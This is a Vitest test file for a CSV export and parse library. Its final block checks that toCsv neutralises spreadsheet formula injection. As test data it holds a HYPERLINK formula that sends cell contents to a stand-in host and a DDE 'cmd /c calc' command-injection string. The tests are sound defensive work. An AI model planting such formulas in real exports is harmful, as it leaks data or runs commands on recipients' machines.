import { describe, expect, it } from "vitest";

import { csvToObjects, parseCsv, toCsv } from "@/lib/csv";

describe("toCsv", () => {
  it("quotes and escapes cells", () => {
    expect(
      toCsv([
        ["a", 'b"c'],
        [1, null],
      ]),
    ).toBe('"a";"b""c"\r\n"1";""');
  });
});

describe("parseCsv", () => {
  it("parses quoted values with separators and newlines", () => {
    const csv = '"sku";"naam"\r\n"A1";"Zaklamp; groot"\r\n"A2";"Regel\nbreak"';
    expect(parseCsv(csv)).toEqual([
      ["sku", "naam"],
      ["A1", "Zaklamp; groot"],
      ["A2", "Regel\nbreak"],
    ]);
  });

  it("ignores empty lines and BOM", () => {
    expect(parseCsv('\uFEFF"a";"b"\n\n"c";"d"\n')).toEqual([
      ["a", "b"],
      ["c", "d"],
    ]);
  });
});

describe("csvToObjects", () => {
  it("maps rows onto lowercased headers", () => {
    const csv = "SKU;Prijs\nA1;19,99";
    expect(csvToObjects(csv)).toEqual([{ sku: "A1", prijs: "19,99" }]);
  });

  it("returns an empty list for empty input", () => {
    expect(csvToObjects("")).toEqual([]);
  });
});

describe("toCsv and spreadsheet formulas", () => {
  // Everything in an export is typed by someone else: customer names, delivery
  // notes, product names from a supplier feed. Quoting does not make a cell
  // text — Excel drops the quotes and evaluates what is left — so a leading
  // apostrophe is what actually stops it running.

  it("neutralises a cell a spreadsheet would run", () => {
    const csv = toCsv([['=HYPERLINK("http://elders.test/?x="&A1,"Klik")']]);
    expect(csv).toBe('"\'=HYPERLINK(""http://elders.test/?x=""&A1,""Klik"")"');
  });

  it("covers every character that starts a formula", () => {
    // "+1" is missing on purpose: it is a number, and the numeric rule below
    // is the one that should win for it.
    for (const cell of ["=1+1", "+1+1", "@SUM(A1)", "\t=1+1", "\r=1+1"]) {
      expect(toCsv([[cell]])).toBe(`"'${cell}"`);
    }
  });

  it("catches the old command-injection form too", () => {
    expect(toCsv([["=cmd|' /c calc'!A1"]])).toContain("\"'=cmd");
  });

  it("leaves a negative amount alone", () => {
    // A minus starts a formula and also starts every refund line in a report.
    // Prefixing those would turn a revenue column into text and break every
    // sum in the sheet.
    expect(toCsv([["-12.50"]])).toBe('"-12.50"');
    expect(toCsv([["-12,50"]])).toBe('"-12,50"');
    expect(toCsv([[-12.5]])).toBe('"-12.5"');
    expect(toCsv([["+3"]])).toBe('"+3"');
  });

  it("leaves ordinary text alone", () => {
    expect(toCsv([["Jan de Vries", "Besjaar lamp 30cm"]])).toBe(
      '"Jan de Vries";"Besjaar lamp 30cm"',
    );
  });

  it("round-trips a neutralised cell back to text, not a formula", () => {
    // The apostrophe is part of the exported cell, so a re-import reads it as
    // the literal text it is. That is the point: it never becomes a formula
    // again on the way back in.
    const parsed = parseCsv(toCsv([["=1+1"]]));
    expect(parsed).toEqual([["'=1+1"]]);
  });
});
